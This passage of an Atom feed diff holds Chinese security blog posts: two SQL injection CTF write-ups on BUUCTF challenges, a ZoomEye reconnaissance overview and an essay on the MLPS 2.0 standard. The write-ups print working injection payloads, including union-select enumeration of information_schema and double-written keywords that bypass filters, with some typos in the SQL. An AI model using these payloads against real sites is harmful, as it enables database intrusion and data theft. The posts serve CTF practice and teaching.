+    <category term="注入" scheme="http://example.com/tags/%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL爆库，表，字段以及双写绕过</title>
+    <link href="http://example.com/2024/10/07/SQL%E7%88%86%E5%BA%93%E5%88%97%E5%AD%97%E6%AE%B5%E4%BB%A5%E5%8F%8A%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"/>
+    <id>http://example.com/2024/10/07/SQL%E7%88%86%E5%BA%93%E5%88%97%E5%AD%97%E6%AE%B5%E4%BB%A5%E5%8F%8A%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/</id>
+    <published>2024-10-07T11:21:04.000Z</published>
+    <updated>2024-10-14T11:57:07.496Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、SQL爆库，表，字段基础"><a href="#一、SQL爆库，表，字段基础" class="headerlink" title="一、SQL爆库，表，字段基础"></a>一、SQL爆库，表，字段基础</h2><h3 id="1-select"><a href="#1-select" class="headerlink" title="1.select"></a>1.select</h3><p>在SQL语句中select username from table where id&#x3D;1，这条语句执行的在table表中查询并返回id为1的username数据，那select我们可以理解为查询返回的数据，那select 1这条语句我们则可以简单理解为查询并返回1,在简单的无过滤SQL注入题目中如果只有一个回显result：？，输入提交select 1的话，就会输出result：1</p><h3 id="2-unino"><a href="#2-unino" class="headerlink" title="2.unino"></a>2.unino</h3><p>unino操作符用于合并两个或多个select语句的结果集，比如unino select 1,2这段语句就会将1,2两个数据作为结果集，分别返回1,2,如果回显为<br>result1:?;result2:?<br>输入提交unino select 1,2的话，就会回显result1：1;result2:2</p><h3 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat()"></a>3.group_concat()</h3><p>group_concat() 函数将 group by子句产生的同一个分组中的值连接起来，返回一个字符串结果。<br>简单的说，就是该函数传入的变量含有多个值，该函数能将这多个值用逗号隔开，并返回一个字符串</p><h2 id="二、SQL爆库，表，字段原理"><a href="#二、SQL爆库，表，字段原理" class="headerlink" title="二、SQL爆库，表，字段原理"></a>二、SQL爆库，表，字段原理</h2><p>SQL数据库中有默认库information_schema中，其中包含两个重要表</p><h3 id="1-information-schema-schemata"><a href="#1-information-schema-schemata" class="headerlink" title="1.information_schema.schemata"></a>1.information_schema.schemata</h3><p>  schemata表中包含了数据库存在的所有的库名，库名的字段为 schema_name<br>     那如果只有一个回显时，我们就可以输入<br>     <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <br></code></pre></td></tr></table></figure><br>     查询并返回schemata表中schema_name的所有值。<br>如果有多个回显，我们就可以用数字进行占位nion select 1,2,……,group_concat(schema_name) from information_schema.schemata最后一个回显就会是所有库名了</p><h3 id="2-information-schema-tables"><a href="#2-information-schema-tables" class="headerlink" title="2.information_schema.tables"></a>2.information_schema.tables</h3><p>  tables表中包含了数据库存在的所有的表名，库名的字段为 table_name,此时爆表要加where<br>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>?<br></code></pre></td></tr></table></figure><br>  其中？内填写爆的库名</p><h3 id="3-information-schema-columns"><a href="#3-information-schema-columns" class="headerlink" title="3.information_schema.columns"></a>3.information_schema.columns</h3><p>  columns表中包含了数据库存在的所有的字段名，库名的字段为 column_name，其他和爆表同理</p><p>知道了以上三种我们就能获得所有库名，表名，和字段名<br>拥有字段名我们就能进行获得想要的各种值了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(字段名) <span class="hljs-keyword">from</span> 表名<br>或者<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(字段名) <span class="hljs-keyword">from</span> 库名.表名<br></code></pre></td></tr></table></figure><p>以上就是爆库，表，列名的基本操作</p><h2 id="三、双写绕过"><a href="#三、双写绕过" class="headerlink" title="三、双写绕过"></a>三、双写绕过</h2><p>但是在实际注入过程中后端不会轻易的放过你的数据，会用各种规则进行过滤，这时候我们就需要绕过这些过滤规则，这里我先介绍一种比较简单的绕过方式——双写绕过</p><p>原理<br>后端有时候会对一些敏感数据进行一些处理，常见的就像将敏感数据修改为空，比如当判断存在unino时，就将它变为空，解决的方法也很简单，改成ununinoino即可，当unino为空时，前后两段字符刚好组合成union，成功绕过</p><h2 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h2><p> 我们选择buuctf中的一道SQL注入题目为例子<br> buuctf：<a href="https://buuoj.cn/">https://buuoj.cn/</a><br><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/title.png"><br>当我们输入1’ union select 1#时，会显示第一行1#附近有语法错误，这时候就是对1#前面的数据进行了过滤，这时候我们双写一下试试1’ ununionion selselectect 1#<br><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/one.png"><br>发现双写绕过可行，但是列数不对尝试增加列数，输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion selselectect 1，2,3#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/onecolumn.png"><br>列数正确为3,且回显示为2和3<br><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/twocolumn.png"><br>尝试爆库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,2,group_concat(schema_name) from information_schema.schemata#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/schone.png"><br>发现还是有过滤显示.schemata#前有information_schema，from过滤，继续尝试双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,2,group_concat(schema_name) frfromom informainformationtion_schema.schemata#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/or.png"><br>发现双写过头了过滤的是or，修改数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/sch.png"><br>可以拿到库名，发现ctf很特别，我们爆一下表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorr mation_schema.tables where table_schema=&#x27;</span>ctf<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/tableone.png"><br>发现where过滤，继续双写</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorr mation_schema.tables whwhereere table_schema=&#x27;</span>ctf<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/table.png"><br>获得表名Flag，继续爆字段<br><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/column.png"><br>拿到字段flag，获取内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,2,union select group_concat(flag) frfromom ctf.Flag#</span><br></code></pre></td></tr></table></figure><p>成功拿到flag<br><img src="/img/sql%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97/flag.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、SQL爆库，表，字段基础&quot;&gt;&lt;a href=&quot;#一、SQL爆库，表，字段基础&quot; class=&quot;headerlink&quot; title=&quot;一、SQL爆库，表，字段基础&quot;&gt;&lt;/a&gt;一、SQL爆库，表，字段基础&lt;/h2&gt;&lt;h3 id=&quot;1-select&quot;&gt;&lt;a href</summary>
+      
+    
+    
+    
+    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
+    <category term="sql" scheme="http://example.com/tags/sql/"/>
+    
+    <category term="绕过" scheme="http://example.com/tags/%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL注入</title>
+    <link href="http://example.com/2024/10/07/SQL%E6%B3%A8%E5%85%A5/"/>
+    <id>http://example.com/2024/10/07/SQL%E6%B3%A8%E5%85%A5/</id>
+    <published>2024-10-07T05:41:49.000Z</published>
+    <updated>2024-10-14T11:57:35.085Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、SQL注入简介"><a href="#一、SQL注入简介" class="headerlink" title="一、SQL注入简介"></a>一、SQL注入简介</h2><p>SQL注入是最常见的web漏洞，本质就是前端没有对表单数据做合理性校验，导致前端提交的数据被后端直接当成数据库代码执行，因此攻击者可以构造不同的SQL语句来查询数据库数据。</p><h2 id="二、SQL注入条件"><a href="#二、SQL注入条件" class="headerlink" title="二、SQL注入条件"></a>二、SQL注入条件</h2><p>1.用户能控制传入后端的数据<br>2.web应用程序把数据作为数据库代码执行</p><h2 id="三、注入步骤"><a href="#三、注入步骤" class="headerlink" title="三、注入步骤"></a>三、注入步骤</h2><h3 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h3><p>如果存在注入漏洞，且输入数据类型为整型，则可以认为是数字型注入<br>假设对应SQL语句为<code>select * from table where id=?</code>其中id为用户以get形式传递的参数</p><h4 id="（1）正常输入"><a href="#（1）正常输入" class="headerlink" title="（1）正常输入"></a>（1）正常输入</h4><p>URL后加上？id&#x3D;1,这时候SQL语句为<code>select * from table where id=1</code>会查询表内id为1的数据</p><h4 id="（2）单引号测试"><a href="#（2）单引号测试" class="headerlink" title="（2）单引号测试"></a>（2）单引号测试</h4><p>URL后加上？id&#x3D;1’,这时候SQL语句为<code>select * from table where id=1’</code>此时SQL语句错误，系统会抛出异常</p><h4 id="（3）and-true测试"><a href="#（3）and-true测试" class="headerlink" title="（3）and true测试"></a>（3）and true测试</h4><p>URL后加上？id&#x3D;1 and 1&#x3D;1,这时候SQL语句为<code>select * from table where id=1 and 1=1</code>其中1&#x3D;1为true，那就和（1）情况一样，查询表内id&#x3D;1的数据</p><h4 id="（4）and-false测试"><a href="#（4）and-false测试" class="headerlink" title="（4）and false测试"></a>（4）and false测试</h4><p>URL后加上？id&#x3D;1 and 1&#x3D;2,这时候SQL语句为<code>select * from table where id=1 and 1=2</code>其中1&#x3D;2为false，则该语句虽然可以正常执行，但查询不了数据</p><h4 id="（5）or-true测试"><a href="#（5）or-true测试" class="headerlink" title="（5）or true测试"></a>（5）or true测试</h4><p>URL后加上？id&#x3D;1 or 1&#x3D;1,这时候SQL语句为<code>select * from table where id=1 or 1=1</code>其中1&#x3D;1为true，那语句就变成查询所有id存在的数据，一般来说这时候我们就能够获取到需要的数据了</p><h3 id="2-字符串型注入"><a href="#2-字符串型注入" class="headerlink" title="2.字符串型注入"></a>2.字符串型注入</h3><p>如果存在注入漏洞，且输入数据类型为字符串，则可以认为是字符串型注入<br>与整数型注入不同的是，字符串注入需要使用单引号闭合<br>假设对应SQL语句为<code>select * from table where username=？</code>其中username为用户以get形式传递的参数</p><h4 id="（1）正常输入-1"><a href="#（1）正常输入-1" class="headerlink" title="（1）正常输入"></a>（1）正常输入</h4><p>URL后加上？username&#x3D;admin,这时候SQL语句为<code>select * from table where username=&#39;admin&#39;</code>会查询username为admin的数据</p><h4 id="（2）单引号测试-1"><a href="#（2）单引号测试-1" class="headerlink" title="（2）单引号测试"></a>（2）单引号测试</h4><p>URL后加上？username&#x3D;admin’,这时候SQL语句为<code>select * from table where username=&#39;admin&#39;’</code>此时SQL语句错误，系统会抛出异常</p><h4 id="3-and-true测试"><a href="#3-and-true测试" class="headerlink" title="(3) and true测试"></a>(3) and true测试</h4><p>URL后加上？username&#x3D;admin’ and 1&#x3D;1,这时候SQL语句为<code>select * from table where username=&#39;admin&#39; and 1=1&#39;</code>此时语句末尾存在单引号，语句错误系统抛出错误<br>那我们只要把最后的引号注释掉就可以正常执行了，URL后加上？username&#x3D;admin’ and 1&#x3D;1#,这时候SQL语句为select * from table where username&#x3D;’admin’ and 1&#x3D;1#’，而#为注释符号，执行语句时会忽略#后面的部分，在这里就是忽略最后的’,则最后能够正常执行，结果与（1）相同</p><p>最后and false与or测试只要最后加上#注释符，最后预期结果都与整数型注入的对应结果相同<br>除#号注释符外，还有–和–%20等其他注释方式，详细可了解<br><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076">https://blog.csdn.net/weixin_43096078/article/details/108215076</a></p><h2 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h2><p>我们选择buuctf中的一道SQL注入题目为例子</p><h3 id="buuctf：https-buuoj-cn"><a href="#buuctf：https-buuoj-cn" class="headerlink" title="buuctf：https://buuoj.cn/"></a>buuctf：<a href="https://buuoj.cn/">https://buuoj.cn/</a></h3><p><img src="/img/sql%E6%B3%A8%E5%85%A5/title.png"><br>首先名字为EASYSQL,那就用SQL注入浅浅的做一下<br>这种表单数据提交一般都是字符串型注入<br>先是抓包正常输入username&#x3D;1,password&#x3D;1看一下正常页面是怎么样的<br><img src="/img/sql%E6%B3%A8%E5%85%A5/common.png"><br>提示错误，再试试单引号测试<br><img src="/img/sql%E6%B3%A8%E5%85%A5/sql.png"><br>翻译一下回显页面”您的 SQL 语法有错误;检查与您的 MariaDB 服务器版本相对应的手册，了解在第 1 行的 ‘1’’’ 附近使用的正确语法”,可以知道第一行有SQL注入漏洞，就是username，那对第一行进行and true测试，由于抓包改get传参数’后面的数据难改，就回到原本题目页面输入，发现和正常输入回显一样<br><img src="/img/sql%E6%B3%A8%E5%85%A5/and.png"><br><img src="/img/sql%E6%B3%A8%E5%85%A5/commonresult.png"><br>那就直接or测试进行攻击，拿到flag<br><img src="/img/sql%E6%B3%A8%E5%85%A5/or.png"><br><img src="/img/sql%E6%B3%A8%E5%85%A5/orreslut.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、SQL注入简介&quot;&gt;&lt;a href=&quot;#一、SQL注入简介&quot; class=&quot;headerlink&quot; title=&quot;一、SQL注入简介&quot;&gt;&lt;/a&gt;一、SQL注入简介&lt;/h2&gt;&lt;p&gt;SQL注入是最常见的web漏洞，本质就是前端没有对表单数据做合理性校验，导致前端提交</summary>
+      
+    
+    
+    
+    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
+    <category term="注入" scheme="http://example.com/tags/%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ZoomEye</title>
+    <link href="http://example.com/2024/10/06/ZoomEye/"/>
+    <id>http://example.com/2024/10/06/ZoomEye/</id>
+    <published>2024-10-06T12:05:32.000Z</published>
+    <updated>2024-10-14T11:50:55.510Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、ZoomEye介绍"><a href="#一、ZoomEye介绍" class="headerlink" title="一、ZoomEye介绍"></a>一、ZoomEye介绍</h2><p>ZoomEye（钟馗之眼）是一个针对网络空间的搜索引擎。它主要收集网络中的主机、服务器等信息，对这些数据进行了整理、整合的强大的网络搜索引擎。<br><img src="/img/zoomeye/zoomeye.png"><br>zoomeye的一些主要特点和功能：<br>    广泛的网络覆盖：ZoomEye能够扫描整个互联网，覆盖全球范围内的网络设备和服务。<br>    详尽的信息收录：收录了大量的网络设备和服务的详细信息，包括但不限于IP地址、地理位置、开放端口、服务类型等。<br>    实时更新：ZoomEye持续进行网络扫描，确保数据库中的信息是最新的。<br>    可视化界面：提供直观的搜索界面和结果展示，用户可以轻松地进行搜索和筛选。<br>    设备搜索：用户可以根据设备类型、操作系统、服务、端口等条件进行搜索。<br>    服务搜索：可以搜索特定的服务，如HTTP、HTTPS、FTP、SSH等。<br>    端口扫描：显示设备开放的端口及其对应的服务信息。<br>    地理位置信息：展示设备的地理位置，帮助用户了解网络资产的分布情况。<br>    指纹识别：识别设备的指纹信息，包括设备类型、厂商、型号等。<br>    漏洞关联：与漏洞数据库关联，提示设备可能存在的安全漏洞。<br>    可视化展示：通过地图、图表等形式直观展示搜索结果和数据分析。<br>    API接口：提供API接口，方便开发者集成ZoomEye的功能到自己的工具或系统中。<br>    高级搜索：支持高级搜索选项，如正则表达式搜索、搜索结果过滤等。<br>    数据导出：允许用户将搜索结果导出为CSV或其他格式，便于进一步分析。</p><h2 id="二、ZoomEye官网"><a href="#二、ZoomEye官网" class="headerlink" title="二、ZoomEye官网"></a>二、ZoomEye官网</h2><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p><h2 id="三、ZoomEye类似工具"><a href="#三、ZoomEye类似工具" class="headerlink" title="三、ZoomEye类似工具"></a>三、ZoomEye类似工具</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p>被誉为“物联网的搜索引擎”，专注于扫描和索引连接到互联网的各种设备，如智能家居设备、工业控制系统(ICS)、摄像头、数据库等。</p><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h3><p>提供全球互联网设备的可视化视图，帮助用户了解网络的整体安全状况。</p><h3 id="BinaryEdge"><a href="#BinaryEdge" class="headerlink" title="BinaryEdge"></a>BinaryEdge</h3><p>提供全球互联网空间的监控和数据分析服务，通过持续扫描互联网，生成实时的安全情报和数据报表。</p><h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><p>由白帽汇开发，功能全面，支持多种协议和服务的扫描与检索。</p><h3 id="onyphe"><a href="#onyphe" class="headerlink" title="onyphe"></a>onyphe</h3><p>面向网络安全专业人士的数据搜索引擎，汇集了多个来源的数据，包括开放端口、漏洞、情报和暗网活动等。<br>其他</p><h3 id="Queke、hunter等"><a href="#Queke、hunter等" class="headerlink" title="Queke、hunter等"></a>Queke、hunter等</h3><h2 id="四、简单使用"><a href="#四、简单使用" class="headerlink" title="四、简单使用"></a>四、简单使用</h2><p>ZoomEye中有许多的关键词，如：<br>app：组件名称 ver：组件版本<br>port:搜索端口号<br>OS:搜索指定的操作系统<br>service：服务名称<br>country：国家名 city：城市名<br>Device：搜索指定的设备类型，divice:router<br>ip:搜索特定的IP地址<br>cidr：指定的CIDR网段<br>Service：搜索指定的服务类型</p><p>举例:app:apache ver:2.4 搜索 apache 2.4<br>port:22 搜索开放了SSH端口的主机<br>Service:SSH 搜索SSH服务<br>OS:linux<br>country:China city: Beijing<br>ip:192.168.1.1<br>CIDR：192.168.158.12&#x2F;24<br>service:http</p><h2 id="五、子域名搜索"><a href="#五、子域名搜索" class="headerlink" title="五、子域名搜索"></a>五、子域名搜索</h2><h3 id="1-使用在线网站搜索子域名"><a href="#1-使用在线网站搜索子域名" class="headerlink" title="1.使用在线网站搜索子域名"></a>1.使用在线网站搜索子域名</h3><p><a href="https://tools.yum6.cn/Tools/urlblast/">https://tools.yum6.cn/Tools/urlblast/</a><br><img src="/img/zoomeye/tool.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、ZoomEye介绍&quot;&gt;&lt;a href=&quot;#一、ZoomEye介绍&quot; class=&quot;headerlink&quot; title=&quot;一、ZoomEye介绍&quot;&gt;&lt;/a&gt;一、ZoomEye介绍&lt;/h2&gt;&lt;p&gt;ZoomEye（钟馗之眼）是一个针对网络空间的搜索引擎。它主要收集网</summary>
+      
+    
+    
+    
+    <category term="网络渗透" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="ZoomEye" scheme="http://example.com/tags/ZoomEye/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>对等保2.0的看法</title>
+    <link href="http://example.com/2024/10/05/%E5%AF%B9%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%9C%8B%E6%B3%95/"/>
+    <id>http://example.com/2024/10/05/%E5%AF%B9%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%9C%8B%E6%B3%95/</id>
+    <published>2024-10-05T10:30:50.000Z</published>
+    <updated>2024-10-14T11:55:31.589Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>等保2.0是网络安全等级保护制度的第二代标准，是对原有信息安全等级保护（简称”等保1.0”）的深化和完善。这一制度旨在应对信息技术快速发展带来的新挑战，通过主动防御、事前、事中、事后全流程的安全可信、动态感知和全面审计，提升网络安全防护水平。等保2.0强调可信计算技术的使用，并将可信验证功能要求列入各个级别，逐级提出各个环节的具体要求。</p><h2 id="二、要求"><a href="#二、要求" class="headerlink" title="二、要求"></a>二、要求</h2><p>等保2.0标准体系涉及众多标准，包括《信息安全技术 网络安全等级保护定级指南》（GB&#x2F;T 22240-2020）、《信息安全技术 网络安全等级保护测评要求》（GB&#x2F;T 28448-2019）等。这些标准对数据安全、个人信息保护提出了更高的要求，例如要求对数据进行分区管理，设置独立安全区域以隔离敏感数据。此外，等保2.0还强化了密码技术和可信计算技术的使用，把可信验证列入各个级别并逐级提出各个环节的主要可信验证要求。</p><h2 id="三、不同点"><a href="#三、不同点" class="headerlink" title="三、不同点"></a>三、不同点</h2><h3 id="与等保1-0相比，等保2-0有以下几个主要不同点："><a href="#与等保1-0相比，等保2-0有以下几个主要不同点：" class="headerlink" title="与等保1.0相比，等保2.0有以下几个主要不同点："></a>与等保1.0相比，等保2.0有以下几个主要不同点：</h3><p>1.覆盖范围的扩展：等保2.0不仅涵盖了传统的信息系统，还包括了云计算、大数据、物联网、移动互联等领域，更好地适应了数字化时代的发展需求。<br>2.技术要求的提升：等保2.0强化了可信计算技术的使用，并把可信验证功能要求列入各个级别，逐级提出各个环节的具体要求。<br>3.管理要求的细化：等保2.0增加了“外部运维管理”控制点，并对外部运维管理提出了更严格的要求。<br>4.安全防护策略的变化：从被动防御转变为主动式防御，以应对新技术和新应用带来的挑战。</p><h2 id="四、扩展要求"><a href="#四、扩展要求" class="headerlink" title="四、扩展要求"></a>四、扩展要求</h2><h3 id="1-云计算安全扩展要求："><a href="#1-云计算安全扩展要求：" class="headerlink" title="1.云计算安全扩展要求："></a>1.云计算安全扩展要求：</h3><p>包括安全物理环境、安全通信网络、安全区域边界、安全计算环境和安全管理中心等五个部分。<br>针对云计算平台的安全架构、访问控制、入侵防范和安全审计等方面提出了详细的安全标准。</p><h3 id="2-移动互联安全扩展要求："><a href="#2-移动互联安全扩展要求：" class="headerlink" title="2.移动互联安全扩展要求："></a>2.移动互联安全扩展要求：</h3><p>对移动应用来源进行管理，实施软件白名单功能，控制应用软件的安装和运行。<br>包括无线边界控制、入侵防范、移动终端管理等内容。</p><h3 id="3-物联网安全扩展要求："><a href="#3-物联网安全扩展要求：" class="headerlink" title="3.物联网安全扩展要求："></a>3.物联网安全扩展要求：</h3><p>针对物联网设备和系统的特殊性，提出了室外控制设备防护、工业控制系统网络架构安全、拨号使用控制、无线使用控制和控制设备安全等方面的要求。</p><h3 id="4-工业控制系统安全扩展要求："><a href="#4-工业控制系统安全扩展要求：" class="headerlink" title="4.工业控制系统安全扩展要求："></a>4.工业控制系统安全扩展要求：</h3><p>针对工业控制系统的实时性要求，提出了室外控制设备防护、工业控制系统网络架构安全、拨号使用控制、无线使用控制和控制设备安全等方面的要求。<br>包括室外控制设备防护、工业控制系统网络架构安全、拨号使用控制、无线使用控制和控制设备安全等方面的要求。</p><h3 id="5-大数据安全扩展要求："><a href="#5-大数据安全扩展要求：" class="headerlink" title="5.大数据安全扩展要求："></a>5.大数据安全扩展要求：</h3><p>对大数据平台提出了新的安全扩展要求，包括数据完整性、数据保密性等方面的具体要求。<br>等保2.0标准不仅覆盖了传统信息系统，还扩展到了网络基础设施、云计算平台、大数据平台、物联网、工业控制系统和采用移动互联技术的系统等多个领域，提出了相应的安全扩展要求。这些扩展要求旨在应对新技术带来的安全挑战，确保各类信息系统在不同业务场景下的安全性。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、概念&quot;&gt;&lt;a href=&quot;#一、概念&quot; class=&quot;headerlink&quot; title=&quot;一、概念&quot;&gt;&lt;/a&gt;一、概念&lt;/h2&gt;&lt;p&gt;等保2.0是网络安全等级保护制度的第二代标准，是对原有信息安全等级保护（简称”等保1.0”）的深化和完善。这一制度旨在应对信</summary>
+      
+    
+    
+    
+    <category term="网络渗透" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="等保2.0" scheme="http://example.com/tags/%E7%AD%89%E4%BF%9D2-0/"/>
+    
+  </entry>
+  
+</feed>
